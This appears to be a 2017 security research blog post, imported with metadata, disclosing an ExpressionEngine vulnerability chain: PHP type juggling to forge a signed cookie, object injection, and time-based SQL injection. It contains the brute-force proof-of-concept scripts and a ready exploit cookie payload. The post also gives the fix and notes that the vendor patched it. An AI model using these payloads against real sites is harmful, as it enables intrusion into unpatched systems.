---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-02-07_type-juggling-and-php-object-injection-and-sqli-oh-my.md
original_filename: 2017-02-07_type-juggling-and-php-object-injection-and-sqli-oh-my.md
title: Type Juggling and PHP Object Injection, and SQLi, Oh My!
category: documents
detected_topics:
- sqli
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- sqli
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 31a98775a41a2a373d6fb189a6f9366d34cf36ad6f50b34fd7100b27fc3c2ed4
text_sha256: 9476f41e1deef4876d590c45e0d54b7eb4a66c083832071927f8e79c095ba2d7
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: true
---

# Type Juggling and PHP Object Injection, and SQLi, Oh My!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-02-07_type-juggling-and-php-object-injection-and-sqli-oh-my.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, otp, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: True
- Raw SHA256: `31a98775a41a2a373d6fb189a6f9366d34cf36ad6f50b34fd7100b27fc3c2ed4`
- Text SHA256: `9476f41e1deef4876d590c45e0d54b7eb4a66c083832071927f8e79c095ba2d7`


## Content

---
title: "Type Juggling and PHP Object Injection, and SQLi, Oh My!"
url: "https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/"
final_url: "https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/"
authors: ["Justin Kennedy (@jstnkndy)"]
bugs: ["Type juggling", "PHP object injection", "Insecure deserialization", "SQL injection"]
publication_date: "2017-02-07"
added_date: "2022-11-11"
source: "pentester.land/writeups.json"
original_index: 6228
---

Posted on [February 7, 2017February 8, 2017](https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/)

# Type Juggling and PHP Object Injection, and SQLi, Oh My!

By [@jstnkndy](https://foxglovesecurity.wordpress.com/mentions/jstnkndy/)

While looking for bugs in a target recently I came across a host that was running Expression Engine, a content management platform. This specific application caught my eye because upon attempting to login to the application with the username ‘admin’, the server responded with a cookie that contained PHP serialized data. As we’ve shown [before](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/), unserializing user supplied data can result in unintended behavior; in some cases, even code execution. Rather than working blind I decided to check to see if I could download a copy of the software, walk through the code to figure out what was happening with the serialized data, and spin up a copy locally to test against.

Once I had a copy of the code locally I grep’d for where the cookie was being used and found the file “ _./system/ee/legacy/libraries/Session.php_ ” which makes sense, cookies are used for sessions. Looking at Session.php I came across the following method that is responsible for unserializing the serialized data:
  
  
  1282  protected function _prep_flashdata()
  1283  {
  1284  if ($cookie = ee()->input->cookie('flash'))
  1285  {
  1286  if (strlen($cookie) > 32)
  1287  {
  1288  $signature = substr($cookie, -32);
  1289  $payload = substr($cookie, 0, -32);
  1290
  1291  if (md5($payload.$this->sess_crypt_key) == $signature)
  1292  {
  1293  $this->flashdata = unserialize(stripslashes($payload));
  1294  $this->_age_flashdata();
  1295
  1296  return;
  1297  }
  1298  }
  1299  }
  1300
  1301  $this->flashdata = array();
  1302  }
  

Walking through the code we see that a couple checks are performed before our cookie is parsed and then unserialized on line 1293. So let’s first look at our cookie, walk through the checks, and see if we can reach the call to “ _unserialize()_ “:
  
  
  a%3A2%3A%7Bs%3A13%3A%22%3Anew%3Ausername%22%3Bs%3A5%3A%22admin%22%3Bs%3A12%3A%22%3Anew%3Amessage%22%3Bs%3A38%3A%22That+is+the+wrong+username+or+password%22%3B%***REDACTED-SUSPECT-TOKEN***And urldecoded:
  
  
  a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:38:"That is the wrong username or password";}***REDACTED-SUSPECT-TOKEN***If a flash cookie exists we load the data into the “ _$cookie_ ” variable on line 1284, which it does so we move on. Next we check to see if the length of the cookie data is greater than 32 on line 1286, which it is so we move on. Now we use “ _substr()_ ” to grab the last 32 characters of the cookie data and store it in “ _$signature_ “, then the rest of the cookie and store it in “ _$payload_ “, which looks like:
  
  
  $ php -a
  Interactive mode enabled
  
  php > $cookie = 'a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:38:"That is the wrong username or password";}3f7d80e10a3d9c0a25c5f56199b067d4';
  php > $signature = substr($cookie, -32);
  php > $payload = substr($cookie, 0, -32);
  php > print "Signature: $signature\n";
  Signature: ***REDACTED-SUSPECT-TOKEN***  php > print "Payload: $payload\n";
  Payload: prod_flash=a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:29:"Invalid username or password.";}
  php >
  

Now on line 1291 we are comparing the md5 hashsum of “ _$payload.$this- >sess_crypt_key_” and checking it against the “ _$signature_ ” which we’ve provided at the end of our cookie as you saw above. Doing a quick look through the code shows that the value of “ _$this- >sess_crypt_cookie_” is pulled from “ _./system/user/config/config.php_ ” which is created during install time:
  
  
  ./system/user/config/config.php:$config['encryption_key'] = '033bc11c2170b83b2ffaaff1323834ac40406b79';
  

So let’s define this “ _$this- >sess_crypt_key_” manually as “ _$salt_ ” and look at the md5 hashsum ourselves:
  
  
  php > $salt = '033bc11c2170b83b2ffaaff1323834ac40406b79';
  php > print md5($payload.$salt);
  ***REDACTED-SUSPECT-TOKEN***  php >
  

And sure enough the md5 hashsum matches the “ _$signature_ “. The reason this check is performed is to make sure that the value of “ _$payload_ ” (which is the serialized data) has not been tampered with. At a first glance it looks like this check would be sufficient to prevent such tampering; however, due to PHP being a loosely typed language, there are some pitfalls when performing comparisons.

## Loose Comparisons Sink Ships

Let’s take a quick look at some loose comparisons to get an idea of what we are up against:
  
  
  <?php 
  
  $a = 1;
  $b = 1;
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  ?>
  
  Output:
  
  $ php steps.php
  int(1)
  int(1)
  a and b are the same
  
  
  
  <?php 
  
  $a = 1;
  $b = 0;
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  
  ?>
  
  Output:
  
  $ php steps.php
  int(1)
  int(0)
  a and b are NOT the same
  
  
  
  <?php 
  
  $a = "these are the same";
  $b = "these are the same";
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  
  ?>
  
  Output:
  
  $ php steps.php
  string(18) "these are the same"
  string(18) "these are the same"
  a and b are the same
  
  
  
  <?php 
  
  $a = "these are NOT the same";
  $b = "these are the same";
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  
  ?>
  
  Output:
  
  $ php steps.php
  string(22) "these are NOT the same"
  string(18) "these are the same"
  a and b are NOT the same
  

The results of the examples above are just as we expected, but let’s look what happens when we compare a string to an integer:
  
  
  <?php 
  
  $a = "1";
  $b = 1;
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  
  ?>
  
  Output:
  
  php steps.php
  string(1) "1"
  int(1)
  a and b are the same
  

It looks like PHP is trying to be “helpful” and the comparison is done with the string casted to an integer. Now lastly, let’s look at what happens when we compare two strings that look like integers written in scientific notation:
  
  
  <?php 
  
  $a = "0e111111111111111111111111111111";
  $b = "0e222222222222222222222222222222";
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  
  ?>
  
  Output:
  
  $ php steps.php
  string(32) "0e111111111111111111111111111111"
  string(32) "0e222222222222222222222222222222"
  a and b are the same
  

You can see in the above that even though “ _$a_ ” and “ _$b_ ” are both of type string and are clearly different values, the use of the loose comparison operator results in the comparison evaluating as true, since “0ex” will always be zero when these are cast to integers by PHP. This is known as Type Juggling.

## Juggling Types like a Jester

With this new knowledge, let’s revisit the check that is supposed to prevent us from tampering with the serialized data:
  
  
  if (md5($payload.$this->sess_crypt_key) == $signature)
  

We have control of the value of “ _$payload_ ” and the value of “ _$signature_ ” here, so if we are able to find a payload that when md5()’d with “ _$this- >sess_crypt_key_” results in a hashsum that starts with 0e and ends with all digits, we can bypass the check by setting the “ _$signature_ ” hashsum to a value that starts with 0e and ends with all digits.

In order to test this I modified some code that I found online in order to build a proof of concept that would bruteforce “ _md5($payload.$this- >sess_crypt_key_” until such a hashsum was discovered with my “tampered” payload. Let’s look at the original “ _$payload_ “:
  
  
  $ php -a
  Interactive mode enabled
  
  php > $cookie = 'a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:38:"That is the wrong username or password";}3f7d80e10a3d9c0a25c5f56199b067d4';
  php > $signature = substr($cookie, -32);
  php > $payload = substr($cookie, 0, -32);
  php > print_r(unserialize($payload));
  Array
  (
  [:new:username] => admin
  [:new:message] => That is the wrong username or password
  )
  php >
  

And in my new “ _$payload_ “, instead of displaying “ _That is the wrong username or password_ “, I want to display “ _taquito_ “.

The first element of the serialized array “ _[:new:username] = > admin_” seems like a good place to be able to create a random value, so that’s where we’ll bruteforce.

Note: This proof of concept works offline because I have access to my own instance of “ _$this- >sess_crypt_key_“, without knowledge of this value we would just actively bruteforce this value online.
  
  
  <?php
  set_time_limit(0);
  define('HASH_ALGO', 'md5');
  define('PASSWORD_MAX_LENGTH', 8);
  
  $charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $str_length = strlen($charset);
  
  function check($garbage)
  {
  $length = strlen($garbage);
  $salt = "033bc11c2170b83b2ffaaff1323834ac40406b79";
  $payload = 'a:2:{s:13:":new:username";s:'.$length.':"'.$garbage.'";s:12:":new:message";s:7:"taquito";}';
  #echo "Testing: " . $payload . "\n";
  $hash = md5($payload.$salt);
  $pre = "0e";
  
  if (substr($hash, 0, 2) === $pre) {
  if (is_numeric($hash)) {
  echo "$payload - $hash\n";
  }
  }
  
  }
  
  function recurse($width, $position, $base_string)
  {
  global $charset, $str_length;
  
  for ($i = 0; $i < $str_length; ++$i) {
  if ($position  < $width - 1) {
  recurse($width, $position + 1, $base_string . $charset[$i]);
  }
  check($base_string . $charset[$i]);
  }
  }
  
  for ($i = 1; $i < PASSWORD_MAX_LENGTH + 1; ++$i) {
  echo "Checking passwords with length: $i\n";
  recurse($i, 0, '');
  }
  
  ?>
  

When run we get the an md5 hashsum of our modified “ _$payload_ ” and our instance’s “ _$this- >sess_crypt_key_” that starts with 0e and ends in all digits:
  
  
  $ php poc1.php
  Checking passwords with length: 1
  Checking passwords with length: 2
  Checking passwords with length: 3
  Checking passwords with length: 4
  Checking passwords with length: 5
  a:2:{s:13:":new:username";s:5:"dLc5d";s:12:":new:message";s:7:"taquito";} - ***REDACTED-SUSPECT-TOKEN***Let’s compare this hashsum against any “ _$signature_ ” value (that we are able to provide) that also starts with 0e and ends in all digits:
  
  
  <?php 
  
  $a = "0e553592359278167729317779925758";
  $b = "0e222222222222222222222222222222";
  
  var_dump($a);
  var_dump($b);
  
  if ($a == $b) { print "a and b are the same\n"; }
  else { print "a and b are NOT the same\n"; }
  
  ?>
  
  Output:
  
  $ php steps.php
  string(32) "0e553592359278167729317779925758"
  string(32) "0e222222222222222222222222222222"
  a and b are the same
  

As you can see we’ve successfully modified the original “ _$payload_ ” to contain our new message of “ _taquito_ ” by (ab)using Type Juggling.

## What do you get when you cross a type juggling with a php object injection? a SQLi! Get it?

While being able to modify the displayed message in the browser is fun, let’s look into what else might be able to do passing our own arbitrary data into “ _unserialize()_ “. In order to save ourselves some time, let’s comment out the
  
  
  if (md5($payload.$this->sess_crypt_key) == $signature)
  

and just add
  
  
  if (1)
  

in the “ _./system/ee/legacy/libraries/Session.php_ ” file so that we don’t have to provide a valid signature while we’re playing with “ _unserialize()_ “.

Knowing that we can control the value of “ _[:new:username] = > admin_” inside of the serialized array we look inside of “ _./system/ee/legacy/libraries/Session.php_ ” and notice the following method:
  
  
  335 function check_password_lockout($username = '')
  336 {
  337  if (ee()->config->item('password_lockout') == 'n' OR
  338  ee()->config->item('password_lockout_interval') == '')
  339  {
  340  return FALSE;
  341  }
  342
  343  $interval = ee()->config->item('password_lockout_interval') * 60;
  344
  345  $lockout = ee()->db->select("COUNT(*) as count")
  346  ->where('login_date > ', time() - $interval)
  347  ->where('ip_address', ee()->input->ip_address())
  348  ->where('username', $username)
  349  ->get('password_lockout');
  350
  351  return ($lockout->row('count') >= 4) ? TRUE : FALSE;
  352 }
  

This method works great because it appears to be checking the database to find out if the supplied “ _$username_ ” is locked out pre-authentication. Because we control the value of “ _$username_ “, we should be able to inject our own SQL query here, resulting in a form of SQL injection. Expression Engine is using database driver class to interact with the database, but the original query looks like this (which we could guess pretty closely):
  
  
  SELECT COUNT(*) as count FROM (`exp_password_lockout`) WHERE `login_date` > '$interval' AND `ip_address` = '$ip_address' AND `username` = '$username';
  

We modify our “ _$payload_ ” to
  
  
  a:2:{s:13:":new:username";s:1:"'";s:12:":new:message";s:7:"taquito";}
  

and send it over to the page expecting “ _Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line_ ” but for some reason we get nothing… Hmm…

## You’re not my type…

After a bit of searching around we come across the following code in “ _./system/ee/legacy/database/DB_driver.php_ “:
  
  
  525 function escape($str)
  526 {
  527  if (is_string($str))
  528  {
  529  $str = "'".$this->escape_str($str)."'";
  530  }
  531  elseif (is_bool($str))
  532  {
  533  $str = ($str === FALSE) ? 0 : 1;
  534  }
  535  elseif (is_null($str))
  536  {
  537  $str = 'NULL';
  538  }
  539
  540  return $str;
  541 }
  

On line 527 we see that a “ _is_string()_ ” check is performed against our value and if it’s true, our value is escaped. We can confirm that this actually happening by putting a “ _var_dump_ ” at the beginning and the end of the function and reviewing the output:
  
  
  string(1) "y"
  int(1)
  int(1)
  int(1)
  int(0)
  int(1)
  int(3)
  int(0)
  int(1)
  int(1486399967)
  string(11) "192.168.1.5"
  string(1) "'"
  int(1)
  
  
  
  string(3) "'y'"
  int(1)
  int(1)
  int(1)
  int(0)
  int(1)
  int(3)
  int(0)
  int(1)
  int(1486400275)
  string(13) "'192.168.1.5'"
  string(4) "'\''"
  int(1)
  

Sure enough, we can see that the value of our of “ _‘_ ” has been escaped and is now “ _\’_ “. Luckily for us though, we have a trick up our sleeve.

The escape check is only checking to see if “ _$str_ ” is a string, a boolean, or is null; if it does not match any of these types, “ _$str_ ” will be returned unescaped. This means that if we provide an “ _object_ “, then we should be able to bypass the checks. However, this also means that we need to search for an object that we can use.

## Autoloading to the rescue!

Normally when looking for classes that we can leverage for exploiting unserialize we’ll look for classes with magic methods such as “ ___wakeup_ ” or “ ___destruct_ “, but there are other times when the application actually uses an autoloader. The general idea behind autoloading is that when an object is created, PHP will check to see if it knows anything about that class yet, if not, it will autoload it for you. For us, this means that we don’t have to rely on classes that contain the “ ___wakeup_ ” or “ ___destruct_ ” methods. We just need to find class that has a call to “ ___toString_ ” that we control because the application tries to use the “ _$username_ ” variable as a string.

Looking for such a class we come across the file “ _./system/ee/EllisLab/ExpressionEngine/Library/Parser/Conditional/Token/Variable.php_ “:
  
  
  1  <?php
  2
  3  namespace EllisLab\ExpressionEngine\Library\Parser\Conditional\Token;
  4
  5  class Variable extends Token {
  6
  7  protected $has_value = FALSE;
  8
  9  public function __construct($lexeme)
  10  {
  11  parent::__construct('VARIABLE', $lexeme);
  12  }
  13
  14  public function canEvaluate()
  15  {
  16  return $this->has_value;
  17  }
  18
  19  public function setValue($value)
  20  {
  21  if (is_string($value))
  22  {
  23  $value = str_replace(
  24  array('{', '}'),
  25  array('{', '}'),
  26  $value
  27  );
  28  }
  29
  30  $this->value = $value;
  31  $this->has_value = TRUE;
  32  }
  33
  34  public function value()
  35  {
  36  // in this case the parent assumption is wrong
  37  // our value is definitely *not* the template string
  38  if ( ! $this->has_value)
  39  {
  40  return NULL;
  41  }
  42
  43  return $this->value;
  44  }
  45
  46  public function __toString()
  47  {
  48  if ($this->has_value)
  49  {
  50  return var_export($this->value, TRUE);
  51  }
  52
  53  return $this->lexeme;
  54  }
  55  }
  56
  57  // EOF
  

This class looks perfect for us! We can see that the object calls “ ___construct_ ” with the parameter “ _$lexeme_ ” and then calls “ ___toString_ ” returning the parameter “ _$lexeme_ ” as a string. This is exactly what we are looking for. Let’s put together a quick POC to create the serialized object for us:
  
  
  <?php
  
  namespace EllisLab\ExpressionEngine\Library\Parser\Conditional\Token;
  
  class Variable {
  
  public $lexeme = FALSE;
  
  }
  
  $x = new Variable();
  $x->lexeme = "'";
  echo serialize($x)."\n";
  
  ?>
  
  Output:
  $ php poc.php
  O:67:"EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable":1:{s:6:"lexeme";s:1:"'";}
  

After several hours of trial and error a conclusion was made: escaping is a bitch. When we add our object to our array we need to modify the object above to (notice the extra slashes):
  
  
  a:1:{s:13:":new:username";O:67:"EllisLab\\\\\ExpressionEngine\\\\\Library\\\\\Parser\\\\\Conditional\\\\\Token\\\\Variable":1:{s:6:"lexeme";s:1:"'";}}
  

When we send the payload above, the “ _var_dump_ ” that we inserted into the code before for debugging shows us:
  
  
  string(3) "'y'"
  int(1)
  int(1)
  int(1)
  int(0)
  int(1)
  int(3)
  int(0)
  int(1)
  int(1486407246)
  string(13) "'192.168.1.5'"
  object(EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable)#177 (6) {
  ["has_value":protected]=>
  bool(false)
  ["type"]=>
  NULL
  ["lexeme"]=>
  string(1) "'"
  ["context"]=>
  NULL
  ["lineno"]=>
  NULL
  ["value":protected]=>
  NULL
  }
  

Notice now that we have an “ _object_ ” instead of a “ _string_ ” and that the value of “ _lexeme_ ” is our unescaped “ _‘_ “! And sure enough, down a bit further in the page:
  
  
  <h1>Exception Caught</h1>
  <h2>SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 5:
  SELECT COUNT(*) as count
  FROM (`exp_password_lockout`)
  WHERE `login_date` &gt;  1486407246
  AND `ip_address` =  '192.168.1.5'
  AND `username` =  '</h2>
  mysqli_connection.php:122
  
  

w00t! We have successfully injected our own data into the SQL query, resulting in SQL injection via PHP Object Injection!

## Good Night POC

Lastly, from here a proof of concept was created to inject sleep(5) into the database. One headache I ran into here (granted it was almost midnight after a long day of traveling) was the number of backslashes that the application was “ _md5()_ “‘ing versus the number slashes that were needed to successfully “ _unserialize()_ “, but once that was figured out it resulted in the following:
  
  
  <?php
  set_time_limit(0);
  define('HASH_ALGO', 'md5');
  define('garbage_MAX_LENGTH', 8);
  
  $charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $str_length = strlen($charset);
  
  function check($garbage)
  {
  $length = strlen($garbage) + 26;
  $salt = "033bc11c2170b83b2ffaaff1323834ac40406b79";
  $payload = 'a:1:{s:+13:":new:username";O:67:"EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable":1:{s:+6:"lexeme";s:+'.$length.':"1 UNION SELECT SLEEP(5) # '.$garbage.'";}}';
  #echo "Testing: " . $payload . "\n";
  $hash = md5($payload.$salt);
  $pre = "0e";
  
  if (substr($hash, 0, 2) === $pre) {
  if (is_numeric($hash)) {
  echo "$payload - $hash\n";
  }
  }
  
  }
  
  function recurse($width, $position, $base_string)
  {
  global $charset, $str_length;
  
  for ($i = 0; $i < $str_length; ++$i) {
  if ($position  < $width - 1) {
  recurse($width, $position + 1, $base_string . $charset[$i]);
  }
  check($base_string . $charset[$i]);
  }
  }
  
  for ($i = 1; $i < garbage_MAX_LENGTH + 1; ++$i) {
  echo "Checking garbages with length: $i\n";
  recurse($i, 0, '');
  }
  
  ?>
  
  Output:
  
  $ php poc2.php
  a:1:{s:+13:":new:username";O:67:"EllisLab\\ExpressionEngine\\Library\\Parser\\Conditional\\Token\\Variable":1:{s:+6:"lexeme";s:+31:"1 UNION SELECT SLEEP(5) # v40vP";}} - ***REDACTED-SUSPECT-TOKEN***And the payload that we send to the server (notice the extra slashes once again):
  
  
  Cookie: exp_flash=a%3a1%3a{s%3a%2b13%3a"%3anew%3ausername"%3bO%3a67%3a"EllisLab\\\\\ExpressionEngine\\\\\Library\\\\\Parser\\\\\Conditional\\\\\Token\\\\\Variable"%3a1%3a{s%3a%2b6%3a"lexeme"%3bs%3a%2b31%3a"1+UNION+SELECT+SLEEP(5)+%23+v40vP"%3b}}***REDACTED-SUSPECT-TOKEN***Wait 5 seconds and we get a response 🙂

## The Fix! (edited 08 Feb 2017)

The fix for this type really comes down to an “ _=_ “, as crazy as that is. Replace:
  
  
  if (md5($payload.$this->sess_crypt_key) == $signature)
  

with
  
  
  if (md5($payload.$this->sess_crypt_key) === $signature)
  

**Edit: Several folks have mentioned that this fix is wrong as it can still lead to timing attacks. It looks as though the better way to fix it is to use PHP’s “ _hash_equals()_ “. **

Beyond that, don’t “ _unserialize()_ ” user supplied data!

## Thanks!

I hope you enjoyed reading this post and potentially learned something from it. I learned quite a bit doing this research; I had help from some very smart folks along the way, so I’m happy I have had the opportunity to share my experience with you. There is always more to learn!

I also want to mention that I escalated this vulnerability to Expression Engine on February 2nd, 2017 and they responded back the same day with a new release with a fix; while the fix itself was trivial, this response time was impressive.

### Share this:

  * [ Share on X (Opens in new window) X ](https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/?share=facebook)
  * 

Like Loading...

### _Related_
